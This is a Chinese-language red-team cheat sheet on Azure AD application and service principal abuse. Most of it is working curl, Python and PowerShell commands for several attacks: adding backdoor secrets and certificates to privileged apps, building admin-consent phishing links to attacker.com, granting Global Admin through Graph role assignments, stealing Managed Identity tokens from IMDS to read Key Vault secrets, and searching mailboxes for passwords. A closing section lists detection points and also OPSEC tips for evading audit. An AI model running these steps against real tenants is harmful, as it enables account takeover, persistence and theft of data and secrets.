# Azure AD Application 与 Service Principal 滥用详解

## 核心概念

```
App Registration vs Service Principal:
├─ App Registration (应用注册)
│   ├─ 应用的"模板"定义（全局唯一 Application ID）
│   ├─ 定义所需权限、回调 URL、密钥/证书
│   ├─ 属于创建它的租户
│   └─ 一个 App Registration 可在多个租户中有 Service Principal
│
├─ Service Principal (服务主体)
│   ├─ App Registration 在特定租户中的"实例"
│   ├─ 实际被授予权限的实体
│   ├─ 三种类型:
│   │   ├─ Application: 对应 App Registration
│   │   ├─ Managed Identity: Azure 资源的自动管理身份
│   │   └─ Legacy: 旧版应用
│   └─ 可被分配 Azure AD 角色 / API 权限
│
└─ 关键区别:
    ├─ App Registration = 应用定义（What the app is）
    ├─ Service Principal = 应用实例（What the app can do in this tenant）
    └─ Owner of App Registration ≠ Admin of Service Principal
```

## 密钥/证书添加提权 (addPassword / addKey)

### 前提条件与攻击路径

```
可添加凭据的角色/权限:
├─ Application Owner → 可给自己拥有的 App 添加密钥
├─ Application Administrator → 可给任何 App 添加密钥
├─ Cloud Application Administrator → 同上（除目录角色分配的 App）
├─ Application.ReadWrite.All (Graph API) → 修改任何 App
├─ microsoft.directory/applications/credentials/update → 直接权限
│
└─ 攻击链:
    ├─ 发现有高权限的 Service Principal（如 Global Admin 角色）
    ├─ 给其对应的 App Registration 添加新密钥
    ├─ 使用新密钥以 Service Principal 身份认证
    └─ 获得该 Service Principal 的所有权限
```

### addPassword 攻击

```bash
# 使用 Graph API 给目标 App 添加密码凭据
# 需要: 当前用户是 App Owner 或有 Application.ReadWrite.All

# 1. 列出高价值应用
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/applications?\$select=id,displayName,appId"

# 2. 检查应用的角色分配
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/servicePrincipals?\$filter=appId eq '{target-app-id}'&\$expand=appRoleAssignments"

# 3. 添加新密码
curl -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  "https://graph.microsoft.com/v1.0/applications/{object-id}/addPassword" \
  -d '{"passwordCredential":{"displayName":"backup-cred","endDateTime":"2026-12-31T00:00:00Z"}}'
# 返回值包含 secretText — 这是唯一一次能看到密码明文

# 4. 使用新密码认证
curl -X POST "https://login.microsoftonline.com/{tenant-id}/oauth2/v2.0/token" \
  -d "client_id={app-id}&client_secret={secret-text}&scope=https://graph.microsoft.com/.default&grant_type=client_credentials"
```

### addKey 攻击（证书）

```bash
# 添加证书凭据（更隐蔽 — 密码凭据更易被审计）

# 1. 生成自签名证书
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=backdoor"

# 2. 提取 Base64 编码的证书
CERT_B64=$(openssl x509 -in cert.pem -outform DER | base64)

# 3. 使用 Graph API 添加证书
curl -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  "https://graph.microsoft.com/v1.0/applications/{object-id}/addKey" \
  -d "{\"keyCredential\":{\"type\":\"AsymmetricX509Cert\",\"usage\":\"Verify\",\"key\":\"$CERT_B64\"},\"proof\":\"<proof-JWT>\",\"passwordCredential\":null}"

# 4. 使用证书认证（需要生成 Client Assertion JWT）
# Python 示例:
python3 -c "
import msal
app = msal.ConfidentialClientApplication(
    '{app-id}',
    authority='https://login.microsoftonline.com/{tenant-id}',
    client_credential={'private_key': open('key.pem').read(), 'thumbprint': '{cert-thumbprint}'}
)
result = app.acquire_token_for_client(scopes=['https://graph.microsoft.com/.default'])
print(result['access_token'])
"
```

## Consent Grant 攻击（Admin Consent Phishing）

```
攻击流程:
├─ 1. 攻击者创建恶意应用（自己的租户或多租户 App）
├─ 2. 配置高危权限请求（Mail.Read, Files.ReadWrite.All 等）
├─ 3. 构造 Admin Consent URL 发送给目标管理员
├─ 4. 管理员点击并授权 → 恶意 App 获得租户级权限
└─ 5. 使用 App 的 Client Credentials 持续访问目标数据
```

```bash
# 构造 Admin Consent Phishing URL
TENANT_ID="target-tenant-id-or-common"
CLIENT_ID="attacker-app-client-id"
REDIRECT_URI="https://attacker.com/callback"
SCOPE="https://graph.microsoft.com/.default"

# Admin consent URL
echo "https://login.microsoftonline.com/$TENANT_ID/adminconsent?client_id=$CLIENT_ID&redirect_uri=$REDIRECT_URI"

# 或使用 User Consent（如果租户允许用户自行 consent）
echo "https://login.microsoftonline.com/$TENANT_ID/oauth2/v2.0/authorize?client_id=$CLIENT_ID&response_type=code&redirect_uri=$REDIRECT_URI&scope=$SCOPE&response_mode=query"

# ⛔ 如果目标租户设置:
# "Users can consent to apps" = No → 需要管理员
# "Users can consent to low-risk permissions" → 部分权限可绕过
# "Do not allow user consent" → 必须 Admin Consent
```

### 检查已有的高权限 Consent

```bash
# 列出所有 Admin Consent（AllPrincipals 类型）
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/oauth2PermissionGrants?\$filter=consentType eq 'AllPrincipals'"

# 列出具有高危权限的 Service Principal
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/servicePrincipals?\$expand=appRoleAssignments" | \
  python3 -c "
import json,sys
data = json.load(sys.stdin)
for sp in data.get('value',[]):
    for role in sp.get('appRoleAssignments',[]):
        print(f\"{sp['displayName']} → {role.get('resourceDisplayName','?')}: {role.get('appRoleId','?')}\")
"
```

## App Role 滥用

### 危险 Graph API Permissions 列表

```
⛔ 高危 Application Permissions（无需用户交互）:
├─ RoleManagement.ReadWrite.Directory → 给任何人分配任何角色（≈ Global Admin）
├─ AppRoleAssignment.ReadWrite.All → 给 SP 分配任何 App Role
├─ Application.ReadWrite.All → 修改任何 App（添加密钥/权限）
├─ ServicePrincipalEndpoint.ReadWrite.All → 修改 SP 配置
│
├─ Mail.ReadWrite → 读写任何用户邮件
├─ Files.ReadWrite.All → 读写任何用户的 OneDrive/SharePoint 文件
├─ Sites.ReadWrite.All → 读写所有 SharePoint 站点
│
├─ Directory.ReadWrite.All → 读写目录对象（用户/组/设备）
├─ Group.ReadWrite.All → 修改安全组成员
├─ User.ReadWrite.All → 修改用户属性
├─ User.Export.All → 导出用户数据
│
├─ Policy.ReadWrite.ConditionalAccess → 修改/禁用条件访问策略
├─ Policy.ReadWrite.AuthenticationMethod → 修改认证方法策略
├─ TrustFrameworkKeySet.ReadWrite.All → 修改信任框架密钥
│
└─ ⛔ 终极提权:
    ├─ RoleManagement.ReadWrite.Directory + 任何 App 权限
    │   → 给自己分配 Global Admin
    └─ AppRoleAssignment.ReadWrite.All
        → 给自己分配 RoleManagement.ReadWrite.Directory
        → 然后给自己分配 Global Admin
```

### 利用 RoleManagement.ReadWrite.Directory

```bash
# 如果 Service Principal 有 RoleManagement.ReadWrite.Directory
# 可以给任何用户/SP 分配 Global Admin

# 获取 Global Administrator 角色模板 ID
# 62e90394-69f5-4237-9190-012177145e10 = Global Administrator

# 给攻击者用户分配 Global Admin
curl -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments" \
  -d '{
    "principalId": "<attacker-user-or-sp-object-id>",
    "roleDefinitionId": "62e90394-69f5-4237-9190-012177145e10",
    "directoryScopeId": "/"
  }'
```

### 利用 AppRoleAssignment.ReadWrite.All

```bash
# 给 Service Principal 分配更多 App Role
# 实现权限链式升级

# 获取 Microsoft Graph 的 Service Principal Object ID
GRAPH_SP=$(curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/servicePrincipals?\$filter=appId eq '00000003-0000-0000-c000-000000000000'" | \
  python3 -c "import json,sys; print(json.load(sys.stdin)['value'][0]['id'])")

# 给自己的 SP 分配 RoleManagement.ReadWrite.Directory App Role
# App Role ID for RoleManagement.ReadWrite.Directory: 9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8
curl -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  "https://graph.microsoft.com/v1.0/servicePrincipals/$GRAPH_SP/appRoleAssignedTo" \
  -d '{
    "principalId": "<my-sp-object-id>",
    "resourceId": "'"$GRAPH_SP"'",
    "appRoleId": "9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8"
  }'
```

## Managed Identity 滥用

```
Managed Identity 类型:
├─ System-Assigned: 与 Azure 资源绑定，资源删除则 MI 删除
├─ User-Assigned: 独立创建，可分配给多个资源
│
└─ 攻击场景:
    ├─ 1. 已获取 Azure VM/App Service → 从 IMDS 获取 MI Token
    ├─ 2. MI 可能被分配了过高权限（Contributor/Owner on Subscription）
    ├─ 3. 使用 MI Token 横向移动到其他 Azure 资源
    └─ 4. MI Token 无法刷新 — 每次从 IMDS 获取新 Token
```

```bash
# 从 Azure VM 获取 Managed Identity Token
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# 获取 Graph API Token
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/"

# 获取 Key Vault Token
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/"

# App Service 的 Managed Identity（不同端点）
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2019-08-01" \
  -H "X-IDENTITY-HEADER: $IDENTITY_HEADER"

# 使用 MI Token 操作 Azure 资源
export ARM_TOKEN=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | \
  python3 -c "import json,sys; print(json.load(sys.stdin)['access_token'])")

# 列出订阅
curl -H "Authorization: Bearer $ARM_TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01"

# 列出资源组
curl -H "Authorization: Bearer $ARM_TOKEN" \
  "https://management.azure.com/subscriptions/{sub-id}/resourceGroups?api-version=2021-04-01"

# 读取 Key Vault Secrets（如果 MI 有权限）
KV_TOKEN=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/" | \
  python3 -c "import json,sys; print(json.load(sys.stdin)['access_token'])")
curl -H "Authorization: Bearer $KV_TOKEN" \
  "https://{vault-name}.vault.azure.net/secrets?api-version=7.3"
```

## Multi-Tenant App 跨租户攻击

```
跨租户攻击场景:
├─ 1. 恶意多租户应用
│   ├─ 攻击者注册 Multi-Tenant App
│   ├─ 诱骗目标租户管理员同意安装
│   ├─ App 在目标租户创建 Service Principal
│   └─ 攻击者从自己的租户控制该 App → 访问目标租户数据
│
├─ 2. 已有多租户应用的滥用
│   ├─ 发现目标租户安装了某个 Multi-Tenant App
│   ├─ 如果攻击者能控制该 App 的源租户 → 可跨租户访问
│   └─ 或者: 找到 App 的密钥泄露 → 用密钥访问所有租户
│
└─ 3. B2B Guest 用户 → 跨租户访问
    ├─ Guest 用户可能被分配了过高权限
    ├─ Guest 用户在资源租户中有独立的 Token
    └─ 可通过 Guest 身份枚举资源租户的目录
```

```bash
# 检查租户中的多租户应用
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/servicePrincipals?\$filter=appOwnerOrganizationId ne {my-tenant-id}" | \
  python3 -c "
import json,sys
data = json.load(sys.stdin)
for sp in data.get('value',[]):
    print(f\"App: {sp['displayName']} | Owner Tenant: {sp.get('appOwnerOrganizationId','?')} | AppId: {sp['appId']}\")
"

# 检查哪些外部应用有高权限
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/oauth2PermissionGrants" | \
  python3 -c "
import json,sys
data = json.load(sys.stdin)
for grant in data.get('value',[]):
    if grant.get('consentType') == 'AllPrincipals':
        print(f\"SP: {grant['clientId']} | Scope: {grant.get('scope','?')} | Resource: {grant['resourceId']}\")
"
```

## 工具速查

### ROADtools

```bash
# https://github.com/dirkjanm/ROADtools
# Azure AD 完整枚举

# 认证
roadrecon auth -u user@target.com -p 'password'
roadrecon auth --access-token $AT    # 使用已有 Token
roadrecon auth --prt-cookie <cookie> # 使用 PRT

# 收集数据
roadrecon gather

# Web UI 分析
roadrecon gui
# 浏览器访问 http://127.0.0.1:5000
# 可视化: 用户、组、应用、Service Principal、角色分配
```

### GraphRunner

```powershell
# https://github.com/dafthack/GraphRunner
Import-Module .\GraphRunner.ps1

# 认证
$token = Get-GraphTokenDeviceCode

# 枚举
Invoke-DumpApps -Tokens $token
Invoke-DumpCAPS -Tokens $token        # 条件访问策略
Invoke-DumpUsers -Tokens $token

# 攻击
Invoke-InjectOAuthApp -Tokens $token   # 注入恶意 OAuth App
Invoke-SecurityGroupCloner -Tokens $token  # 克隆安全组

# 数据窃取
Invoke-SearchMailbox -Tokens $token -SearchTerm "password"
Invoke-SearchSharePoint -Tokens $token -SearchTerm "confidential"
```

## 攻击决策树

```
已获取 Azure AD 访问后:
├─ 检查当前权限
│   ├─ 是 Application Owner?
│   │   ├─ 是 → addPassword 添加凭据 → 以 SP 身份操作
│   │   └─ 检查该 App 的 SP 有什么权限
│   │
│   ├─ 有 Application.ReadWrite.All?
│   │   ├─ 是 → 可修改任何 App → 找有高权限 SP 的 App → addPassword
│   │   └─ 否 → 检查其他提权路径
│   │
│   ├─ 有 AppRoleAssignment.ReadWrite.All?
│   │   ├─ 是 → 给自己分配更多 App Role（如 RoleManagement.ReadWrite.Directory）
│   │   └─ 然后给自己分配 Global Admin
│   │
│   └─ 有 RoleManagement.ReadWrite.Directory?
│       └─ 是 → 直接分配 Global Admin
│
├─ 检查 Managed Identity
│   ├─ 在 Azure VM/App Service 上?
│   │   ├─ 是 → 从 IMDS 获取 MI Token
│   │   └─ 检查 MI 的角色分配
│   └─ MI 有 Contributor/Owner? → 控制整个订阅
│
└─ 检查多租户应用
    ├─ 有来自外部租户的 App? → 检查权限
    └─ 可创建多租户 App? → Consent Phishing
```

## 检测与 OPSEC

```
蓝队监控点:
├─ 凭据添加:
│   ├─ Azure AD Audit Log: "Update application - Certificates and secrets management"
│   ├─ Graph API: servicePrincipal/addPassword, application/addKey
│   └─ 监控非常规时间/非常规 IP 的凭据操作
│
├─ Consent Grant:
│   ├─ "Consent to application" 审计事件
│   ├─ 新的 AllPrincipals 类型 OAuth2PermissionGrant
│   └─ 外部租户应用的新 Service Principal 创建
│
├─ 角色分配:
│   ├─ "Add member to role" 审计事件
│   ├─ 非 PIM 激活的直接角色分配
│   └─ Service Principal 被分配高危角色
│
└─ 红队 OPSEC:
    ├─ 添加凭据后立即使用（减少检测窗口）
    ├─ 使用与现有凭据相同的到期时间
    ├─ DisplayName 模仿已有的凭据命名
    └─ 操作完成后删除添加的凭据
```
